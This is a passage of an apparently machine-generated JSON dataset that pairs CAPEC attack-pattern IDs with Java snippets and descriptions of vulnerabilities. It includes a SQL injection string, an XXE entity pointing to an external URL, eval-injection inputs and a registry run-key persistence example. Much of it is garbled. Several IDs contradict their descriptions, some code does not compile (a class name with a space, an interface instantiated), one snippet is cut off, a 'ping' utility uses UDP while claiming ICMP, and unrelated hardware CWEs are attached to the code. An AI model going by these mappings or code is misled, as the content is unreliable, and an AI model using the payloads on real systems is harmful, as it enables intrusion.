        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // Sniffing network traffic to capture authentication data\n        String capturedAuthData = \"captured_auth_data\";\n\n        // Replay the captured authentication data to bypass authentication\n        out.writeUTF(capturedAuthData);\n        out.flush();\n\n        // Client-side authentication, no server-side validation\n        boolean isAuthenticated = true;\n        if (isAuthenticated) {\n            System.out.println(\"Authenticated successfully!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC-65 attack pattern, which involves sniffing application code to bypass authentication. The code captures authentication data by sniffing network traffic and replays it to the server to bypass authentication. Additionally, it performs client-side authentication without server-side validation, making it vulnerable to authentication bypass attacks."
    },
    {
        "capec_id": "260",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-294: Capture-replay attack\n        String capturedAuthenticationMessage = \"captured_authentication_message\";\n        out.writeUTF(capturedAuthenticationMessage);\n        out.flush();\n\n        // CWE-603: Use of Client-Side Authentication\n        boolean isAuthenticated = true;\n        if (isAuthenticated) {\n            System.out.println(\"Authentication successful\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n\n        // CWE-589: Call to Non-ubiquitous API\n        // Assuming this API function does not exist on all versions of the target platform\n        java.awt.peer.FontPeer fontPeer = new java.awt.peer.FontPeer();\n        fontPeer.getFontMetrics();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC-65 attack pattern, which involves sniffing application code to bypass authentication. It includes CWE-294, which is a capture-replay attack where an attacker captures and replays authentication messages to bypass authentication. It also includes CWE-603, which is the use of client-side authentication that can be bypassed by modifying the client code. Additionally, it includes CWE-589, which is the use of a non-ubiquitous API function that may not exist on all versions of the target platform, leading to portability issues."
    },
    {
        "capec_id": "261",
        "code_snippet": "public class VulnerableQuery {\n    public static void main(String[] args) {\n        String userInput = \"' OR 1=1 --\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet result = stmt.executeQuery(query);\n            while (result.next()) {\n                System.out.println(result.getString(\"username\") + \": \" + result.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable query that is susceptible to SQL injection. The userInput variable is not properly validated, allowing an attacker to inject malicious SQL code. The query is constructed by concatenating the userInput with the SQL query, which can lead to unauthorized access to sensitive information. The error handling mechanism also prints the error message, which can reveal sensitive information about the database environment."
    },
    {
        "capec_id": "263",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileProcessor {\n    public static void processFile(String filePath) throws IOException {\n        File file = new File(filePath);\n        if (file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] fileContent = new byte[(int) file.length()];\n            fis.read(fileContent);\n            fis.close();\n\n            // Assume the file content is a Java class file\n            Class<?> clazz = new MyClassLoader().loadClass(\"MyClass\");\n            Object obj = clazz.newInstance();\n            clazz.getMethod(\"process\", byte[].class).invoke(obj, fileContent);\n        }\n    }\n\n    public static class MyClassLoader extends ClassLoader {\n        @Override\n        protected Class<?> findClass(String name) throws ClassNotFoundException {\n            byte[] classBytes = getClassBytesFromUntrustedSource(name);\n            return defineClass(name, classBytes, 0, classBytes.length);\n        }\n\n        private byte[] getClassBytesFromUntrustedSource(String name) {\n            // Get the class bytes from an untrusted source, e.g., a file upload\n            // This is vulnerable to CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            return new byte[0];\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of forcing an application to use a corrupted file, which can lead to denial of service, buffer overflows, or disabling of filters or access controls. The code includes CWE-829: Inclusion of Functionality from Untrusted Control Sphere by loading a class from an untrusted source. It also relates to CWE-646: Reliance on File Name or Extension of Externally-Supplied File, CWE-377: Insecure Temporary File, CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream, and CWE-434: Unrestricted Upload of File with Dangerous Type, as it does not properly validate or handle the uploaded file."
    },
    {
        "capec_id": "264",
        "code_snippet": "public class EvalInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"1; System.out.println(\\\"Malicious code executed\\\" );\";\n        String evalString = \"int x = \" + userInput + \"\";\n        try {\n            Object result = new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(evalString);\n            System.out.println(result);\n        } catch (javax.script.ScriptException e) {\n            e.printStackTrace();}\n    }\n}\n\npublic class GlobalVariablesExample {\n    public static int GLOBAL_VAR = 10;\n    public static void main(String[] args) {\n        System.out.println(GLOBAL_VAR);\n        changeGlobalVar();\n        System.out.println(GLOBAL_VAR);\n    }\n    public static void changeGlobalVar() {\n        GLOBAL_VAR = 20;\n    }\n}\n\npublic class WideScopeExample {\n    public static int varWithWideScope;\n    public static void main(String[] args) {\n        varWithWideScope = 10;\n        if (true) {\n            int varWithNarrowScope = 20;\n            System.out.println(varWithNarrowScope);\n        }\n        System.out.println(varWithWideScope);\n    }\n}\n\npublic class SymbolicConstantsExample {\n    public static void main(String[] args) {\n        int maxAttempts = 5;\n        for (int i = 0; i < maxAttempts; i++) {\n            System.out.println(\"Attempt \" + i);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-13 attack pattern, which involves subverting environment variable values. The code includes examples of CWE-95: Eval Injection, CWE-1126: Declaration of Variable with Unnecessarily Wide Scope, CWE-1107: Insufficient Isolation of Symbolic Constant Definitions, CWE-1106: Insufficient Use of Symbolic Constants, and CWE-1108: Excessive Reliance on Global Variables. The EvalInjectionExample class shows how user input can be used to inject malicious code. The GlobalVariablesExample class demonstrates the use of global variables, which can lead to tight coupling and make the code harder to maintain. The WideScopeExample class illustrates the declaration of a variable with unnecessarily wide scope. The SymbolicConstantsExample class shows how literal constants can make the code harder to maintain and evolve over time."
    },
    {
        "capec_id": "265",
        "code_snippet": "public class VulnerableCode {\n    public static String globalVariable = \"\";\n    public void dynamicEvaluation(String userInput) {\n        String varName = userInput;\n        try {\n            String className = \"VulnerableCode\";\n            Class<?> clazz = Class.forName(className);\n            Object obj = clazz.newInstance();\n            java.lang.reflect.Field field = clazz.getDeclaredField(varName);\n            field.setAccessible(true);\n            field.set(obj, \"maliciousValue\");\n        } catch (Exception e) {}\n    }\n    public void printGlobalVariable() {\n        System.out.println(globalVariable);\n    }\n    public static void main(String[] args) {\n        VulnerableCode vc = new VulnerableCode();\n        vc.dynamicEvaluation(\"globalVariable\");\n        vc.printGlobalVariable();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code has excessive reliance on global variables (CWE-1108), improper control of dynamically-identified variables (CWE-914), and dynamic variable evaluation (CWE-627). The `dynamicEvaluation` method uses user input to dynamically set a variable, which can lead to arbitrary variable access. The `globalVariable` is declared with an unnecessarily wide scope (CWE-1126), making it accessible from multiple parts of the code. An attacker can manipulate the `globalVariable` by providing a malicious input to the `dynamicEvaluation` method."
    },
    {
        "capec_id": "266",
        "code_snippet": "public class EvalInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"1; System.out.println(\\\"Malicious code executed!\\\")\";\n        String template = \"result = \" + userInput + \"\";\n        try {\n            Compiler compiler = new Compiler();\n            Object result = compiler.compile(template);\n            System.out.println(result);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass Compiler {\n    public Object compile(String template) throws Exception {\n        Object result = null;\n        try {\n            // Incorrect behavior order: validate before canonicalize\n            if (isValid(template)) {\n                result = canonicalize(template);\n            }\n        } catch (Exception e) {\n            throw e;\n        }\n        return result;\n    }\n\n    private boolean isValid(String template) {\n        // Failure to protect stored data from modification\n        // Stored data is not properly protected from modification\n        return true;\n    }\n\n    private Object canonicalize(String template) throws Exception {\n        // Compiler optimization removal or modification of security-critical code\n        // Compiler optimization may remove or modify security-critical code\n        return eval(template);\n    }\n\n    private Object eval(String template) throws Exception {\n        // Improperly controlled modification of dynamically-determined object attributes\n        // Attributes can be modified without proper control\n        // Improper neutralization of directives in dynamically evaluated code (eval injection)\n        return new GroovyShell().evaluate(template);\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves a combination of vulnerabilities. It includes incorrect behavior order (validate before canonicalize), failure to protect stored data from modification, compiler optimization removal or modification of security-critical code, improperly controlled modification of dynamically-determined object attributes, and improper neutralization of directives in dynamically evaluated code (eval injection). The code uses a custom Compiler class to evaluate user input, which can lead to malicious code execution."
    },
    {
        "capec_id": "267",
        "code_snippet": "public class VulnerableApp {\n    public void processUserInput(String userInput) {\n        String encodedInput = userInput;\n        try {\n            encodedInput = new String(encodedInput.getBytes(\\",
        "description": "This Java code snippet demonstrates the CAPEC of encoding standard exploitation. It contains multiple CWEs, including CWE-173 (Improper Handling of Alternate Encoding), CWE-172 (Encoding Error), CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize), CWE-181 (Incorrect Behavior Order: Validate Before Filter), CWE-73 (External Control of File Name or Path), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-692 (Incomplete Denylist to Cross-Site Scripting). The code processes user input, applies encoding, validation, canonicalization, and filtering, but does so in an insecure manner, allowing an attacker to inject malicious input and potentially perform unauthorized filesystem operations or XSS attacks."
    },
    {
        "capec_id": "268",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.logging.Logger;\n\npublic class LogManipulation {\n    private static final Logger LOGGER = Logger.getLogger(LogManipulation.class.getName());\n\n    public static void main(String[] args) {\n        try (FileWriter fw = new FileWriter(\"log_file.log\", true);\n             PrintWriter pw = new PrintWriter(fw)) {\n            pw.println(\"[INFO] Successful login by admin\"); // CWE-117: Improper Output Neutralization for Logs\n            pw.println(\"[DEBUG] User credentials: username=password\"); // CWE-532: Insertion of Sensitive Information into Log File\n            for (int i = 0; i < 1000; i++) {\n                pw.println(\"[INFO] Excessive logging data\"); // CWE-779: Logging of Excessive Data\n            }\n            pw.println(\"[ERROR] Critical event occurred, but details omitted\"); // CWE-778: Insufficient Logging\n            pw.println(\"[DEBUG] System information: \" + System.getProperty(\"os.name\")); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        } catch (IOException e) {\n            LOGGER.severe(\"Error writing to log file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of log manipulation by injecting, manipulating, deleting, or forging malicious log entries into the log file. It uses various CWEs to illustrate the vulnerabilities, including improper output neutralization, insertion of sensitive information, logging of excessive data, insufficient logging, and exposure of sensitive system information."
    },
    {
        "capec_id": "269",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class RegistryManipulator {\n    public static void main(String[] args) {\n        try {\n            // CWE-314: Cleartext Storage in the Registry\n            Properties props = new Properties();\n            props.setProperty(\"password\", \"mysecretpassword\");\n            props.store(new FileOutputStream(\"registry.properties\"), \"Registry Configuration\");\n\n            // CWE-270: Privilege Context Switching Error\n            Runtime.getRuntime().exec(\"runas /user:Administrator cmd.exe\");\n\n            // CWE-1112: Incomplete Documentation of Program Execution\n            // No documentation on how the program is executed\n            String program = \"C:\\Program Files\\MyApp\\myapp.exe\";\n            Runtime.getRuntime().exec(program);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-203 pattern by manipulating application registry values. It stores sensitive information in cleartext in the registry (CWE-314), switches privileges without proper management (CWE-270), and lacks documentation on program execution (CWE-1112)."
    },
    {
        "capec_id": "270",
        "code_snippet": "import java.io.IOException;\nimport java.util.prefs.Preferences;\n\npublic class MaliciousLogin {\n    public static void main(String[] args) {\n        try {\n            // CWE-15: External Control of System or Configuration Setting\n            Preferences systemRoot = Preferences.systemRoot();\n            systemRoot.put(\"Run\", \"maliciousExecutable\");\n            \n            // CWE-314: Cleartext Storage in the Registry\n            systemRoot.put(\"maliciousConfig\", \"defaultPassword\");\n            \n            // CWE-520: .NET Misconfiguration: Use of Impersonation\n            // (Note: This is a Java example, but the concept applies)\n            System.setProperty(\"java.security.auth.login.config\", \"maliciousLoginConfig\");\n            \n            // CWE-1392: Use of Default Credentials\n            // CWE-1394: Use of Default Cryptographic Key\n            String defaultKey = \"defaultCryptographicKey\";\n            String defaultPassword = \"defaultPassword\";\n            \n            // Perform malicious actions with default credentials and cryptographic key\n            performMaliciousActions(defaultKey, defaultPassword);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void performMaliciousActions(String defaultKey, String defaultPassword) {\n        // TO DO: Implement malicious actions, such as logging user activity or stealing sensitive data\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack by adding a malicious executable to the Windows registry's 'run keys' to execute when a user logs in. It also incorporates related CWEs, including external control of system settings, cleartext storage in the registry, .NET misconfiguration, use of default credentials, and use of default cryptographic keys. The code uses Java's Preferences API to modify the registry and performs malicious actions with default credentials and cryptographic keys."
    },
    {
        "capec_id": "271",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class SchemaModifier {\n    public static void main(String[] args) {\n        try {\n            // CWE-15: External Control of System or Configuration Setting\n            String schemaFile = System.getProperty(\"schema.file\");\n            File file = new File(schemaFile);\n            Properties props = new Properties();\n            props.load(new FileInputStream(file));\n\n            // CWE-501: Trust Boundary Violation\n            String modifiedSchema = props.getProperty(\"schema.definition\");\n            modifiedSchema += \"<malicious-code>\";\n\n            // CWE-506: Embedded Malicious Code\n            props.setProperty(\"schema.definition\", modifiedSchema);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Modified schema: \" + props);\n\n            // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n            props.store(new FileInputStream(file), \"Modified schema\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of corrupting or modifying a schema to undermine the security of the target. It uses related CWEs to illustrate the vulnerabilities. The code loads a schema file based on an external system property, modifies the schema definition by adding malicious code, and then stores the modified schema back to the file. This code exposes sensitive system information and fails to properly remove sensitive information before storage or transfer."
    },
    {
        "capec_id": "272",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.UnknownHostException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String request = in.readUTF();\n        // No verification of the source of the request\n        processRequest(request);\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        String authRequest = \"auth\" + System.currentTimeMillis();\n        out.writeUTF(authRequest);\n        String response = in.readUTF();\n        // No verification of the authenticity of the response\n        if (response.equals(\"authenticated\")) {\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            String message = \"sensitive_data\";\n            out.writeUTF(message);\n            // No verification of the integrity of the message during transmission\n\n            // CWE-294: Authentication Bypass by Capture-replay\n            String capturedMessage = in.readUTF();\n            out.writeUTF(capturedMessage);\n            // No protection against capture-replay attacks\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            Socket socket2 = new Socket(\"example2.com\", 8080);\n            DataOutputStream out2 = new DataOutputStream(socket2.getOutputStream());\n            out2.writeUTF(\"malicious_request\");\n            // No verification of the intended destination\n        }\n    }\n\n    public static void processRequest(String request) {\n        // Process the request without verifying its authenticity\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable protocol that is susceptible to various attacks due to improper verification of the source of communication channels, reflection attacks in authentication protocols, improper enforcement of message integrity during transmission, authentication bypass by capture-replay, and incorrectly specified destinations in communication channels."
    },
    {
        "capec_id": "273",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String responseFromBackend = getResponseFromBackend(userInput);\n        response.setStatus(200);\n        response.addHeader(\"Content-Type\", \"text/html\");\n        response.getWriter().write(responseFromBackend);\n    }\n\n    private String getResponseFromBackend(String userInput) {\n        // Simulating a vulnerable backend HTTP agent\n        String backendResponse = \"<html><body>\" + userInput + \"</body></html>\";\n        return backendResponse;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP response splitting and smuggling attacks. The servlet takes user input and passes it to a backend HTTP agent, which returns a response that is then sent back to the client without proper validation or sanitization. This allows an attacker to inject malicious content, such as additional HTTP responses or headers, into the response stream, potentially leading to unauthorized actions or data theft."
    },
    {
        "capec_id": "274",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class InsecureServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String verb = req.getParameter(\"verb\");\n        if (verb != null) {\n            if (verb.equalsIgnoreCase(\"GET\")) {\n                // Allow access to restricted resource\n                resp.getWriter().println(\"Access granted\");\n            } else {\n                // Assume verb is immutable and do not validate\n                resp.getWriter().println(\"Access denied\");\n            }\n        } else {\n            // Use GET request method with sensitive query strings\n            String sensitiveData = req.getQueryString();\n            resp.getWriter().println(\"Sensitive data: \" + sensitiveData);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying the HTTP Verb to bypass access restrictions. The code uses a GET request method with sensitive query strings (CWE-598) and assumes the verb is immutable without proper validation (CWE-302). It also relies on a single factor in a security decision (CWE-654) and does not properly encode or escape output (CWE-116). An attacker can exploit this by modifying the HTTP Verb or providing a random string as a verb to bypass access restrictions."
    },
    {
        "capec_id": "275",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class DNS Spoofing {\n    public static void main(String[] args) {\n        try {\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"Enter the IP address to spoof:\");\n            String ipAddress = scanner.nextLine();\n            InetAddress inetAddress = InetAddress.getByName(ipAddress);\n            String hostname = inetAddress.getCanonicalHostName();\n            System.out.println(\"Hostname: \" + hostname);\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            // CWE-1327: Binding to an Unrestricted IP Address\n            // CWE-605: Multiple Binds to the Same Port\n            // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            // Spoof the DNS resolution to point to an internal IP address\n            InetAddress spoofedAddress = InetAddress.getByName(\"internal-ip-address\");\n            String spoofedHostname = spoofedAddress.getCanonicalHostName();\n            System.out.println(\"Spoofed Hostname: \" + spoofedHostname);\n            // Perform a security-critical action based on the spoofed hostname\n            if (spoofedHostname.equals(\"trusted-hostname\")) {\n                System.out.println(\"Access granted!\");\n            } else {\n                System.out.println(\"Access denied!\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS spoofing attack, where an adversary controls a DNS server and changes the IP address resolution to point to an internal IP address within the target organization. The code relies on reverse DNS resolution to obtain the hostname and make a security decision, but it does not properly ensure that the IP address is truly associated with the hostname. This allows the adversary to spoof the DNS resolution and gain unauthorized access."
    },
    {
        "capec_id": "276",
        "code_snippet": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class VulnerableComponent {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"password=123456\";\n        dout.writeUTF(sensitiveData);\n\n        // CWE-707: Improper Neutralization\n        String malformedMessage = \"<malformed>message</malformed>\";\n        dout.writeUTF(malformedMessage);\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        int debugFlag = 1;\n        dout.writeInt(debugFlag);\n\n        // CWE-1292: Incorrect Conversion of Security Identifiers\n        int securityId = 0;\n        dout.writeInt(securityId);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = \"Hello, World!\";\n        dout.writeUTF(message);\n\n        dout.close();\n        din.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable component that communicates with another component over a socket. It violates multiple security principles, including transmitting sensitive information in cleartext, failing to neutralize malformed messages, allowing debug logic to be activated at runtime, incorrectly converting security identifiers, and not ensuring message integrity during transmission. An adversary can exploit these vulnerabilities to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks."
    },
    {
        "capec_id": "277",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NamedNodeMap;\nimport org.w3c.dom.Node;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableDataInterchange {\n    public static void processMedicalRecord(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n            Node patientNode = document.getElementsByTagName(\"patient\").item(0);\n            NamedNodeMap attributes = patientNode.getAttributes();\n            Node idNode = attributes.getNamedItem(\"id\");\n            String patientId = idNode.getNodeValue();\n            // Assume patientId is immutable and use it for authentication\n            authenticatePatient(patientId);\n            // Process sensitive medical information\n            Node medicalInfoNode = document.getElementsByTagName(\"medicalInfo\").item(0);\n            String medicalInfo = medicalInfoNode.getTextContent();\n            System.out.println(\"Medical Information: \" + medicalInfo);\n        } catch (Exception e) {\n            System.out.println(\"Error processing medical record: \" + e.getMessage());\n        }\n    }\n\n    public static void authenticatePatient(String patientId) {\n        // Assume patientId is sufficient for authentication\n        System.out.println(\"Authenticated patient: \" + patientId);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable data interchange protocol implementation. It processes a medical record XML data and assumes that the patient ID is immutable and sufficient for authentication. However, an attacker can manipulate the XML data to impersonate a patient or gain unauthorized access to sensitive medical information. The code is vulnerable to CWE-707 (Improper Neutralization), CWE-1292 (Incorrect Conversion of Security Identifiers), CWE-188 (Reliance on Data/Memory Layout), CWE-201 (Insertion of Sensitive Information Into Sent Data), and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "278",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableWebService {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/webservice\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"X-Custom-Header\", \"exploit\");\n        connection.connect();\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            System.out.println(response.toString());\n        } else {\n            System.out.println(\"Error: \" + responseCode);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable web service that is susceptible to manipulation of call parameters and function calls. The code sends a GET request to a web service with a custom header 'X-Custom-Header' set to 'exploit'. The web service does not properly validate the input, allowing an attacker to manipulate the request and gain access to restricted data or cause the application to crash. This code embodies CWE-707 (Improper Neutralization), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-368 (Context Switching Race Condition), CWE-573 (Improper Following of Specification by Caller), and CWE-444 (Inconsistent Interpretation of HTTP Requests) vulnerabilities."
    },
    {
        "capec_id": "279",
        "code_snippet": "import java.io.IOException;\nimport javax.xml.soap.SOAPBody;\nimport javax.xml.soap.SOAPEnvelope;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.soap.SOAPHeader;\nimport javax.xml.soap.SOAPMessage;\n\npublic class SOAPClient {\n    public static void main(String[] args) throws SOAPException, IOException {\n        SOAPMessage message = MessageFactory.newInstance().createMessage();\n        SOAPEnvelope envelope = message.getSOAPPart().getEnvelope();\n        SOAPHeader header = envelope.getHeader();\n        SOAPBody body = envelope.getBody();\n\n        // CWE-707: Improper Neutralization\n        // No validation of the SOAP message structure\n        body.addChildElement(envelope.createElementNS(\"http://example.com\", \"myElement\"));\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // No server-side validation of the SOAP message\n        // The client is trusted to send a valid message\n\n        // CWE-611: Improper Restriction of XML External Entity Reference\n        // No restriction on XML external entities\n        // An attacker could inject a malicious XML entity\n        String xml = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"http://example.com/malicious\\\">]>\";\n        body.addChildElement(envelope.createElementNS(\"http://example.com\", \"myElement\").setValue(xml));\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // No authentication mechanism to prevent capture-replay attacks\n        // An attacker could capture and replay the SOAP message\n\n        // CWE-603: Use of Client-Side Authentication\n        // No server-side authentication\n        // The client is trusted to authenticate itself\n        // An attacker could modify the client to bypass authentication\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SOAP client that is susceptible to various attacks due to improper neutralization, client-side enforcement of server-side security, improper restriction of XML external entity reference, authentication bypass by capture-replay, and use of client-side authentication."
    },
    {
        "capec_id": "280",
        "code_snippet": "import java.io.IOException;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.ws.WebServiceException;\nimport java.io.StringReader;\nimport java.net.URL;\n\npublic class SoapManipulation {\n    public static void main(String[] args) throws IOException, SOAPException, WebServiceException {\n        URL wsdlUrl = new URL(\"http://example.com/webservice?wsdl\");\n        String wsdlContent = readUrlContent(wsdlUrl);\n        StringReader reader = new StringReader(wsdlContent);\n        // WSDL file exposure (CWE-651)\n        System.out.println(\"WSDL Content: \" + wsdlContent);\n\n        // Authentication Bypass by Capture-replay (CWE-294)\n        String capturedRequest = \"<soap:Envelope>...</soap:Envelope>\";\n        sendCapturedRequest(capturedRequest);\n    }\n\n    private static String readUrlContent(URL url) throws IOException {\n        // TO DO: implement reading URL content\n        return \"\";\n    }\n\n    private static void sendCapturedRequest(String request) throws SOAPException {\n        // TO DO: implement sending captured request\n    }\n}",
        "description": "This Java code snippet demonstrates the SOAP manipulation attack pattern (CAPEC-279) by exposing a WSDL file containing sensitive information (CWE-651) and attempting to bypass authentication by capturing and replaying a SOAP request (CWE-294)."
    },
    {
        "capec_id": "285",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.SocketException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class PingUtility {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"target_system_ip\");\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            packet.setAddress(address);\n            packet.setPort(7);\n            socket.send(packet);\n            socket.setSoTimeout(5000);\n            DatagramPacket receivePacket = new DatagramPacket(buffer, buffer.length);\n            socket.receive(receivePacket);\n            String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n            System.out.println(\"Response from target system: \" + response);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception: \" + e.getMessage());\n        } catch (SocketException e) {\n            System.out.println(\"Socket exception: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"IO exception: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Ping utility that sends an ICMP Echo Request to a target system and receives an ICMP Echo Reply. The code does not implement any security measures, making it vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-444 (Inconsistent Interpretation of HTTP Requests), and CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime)."
    },
    {
        "capec_id": "287",
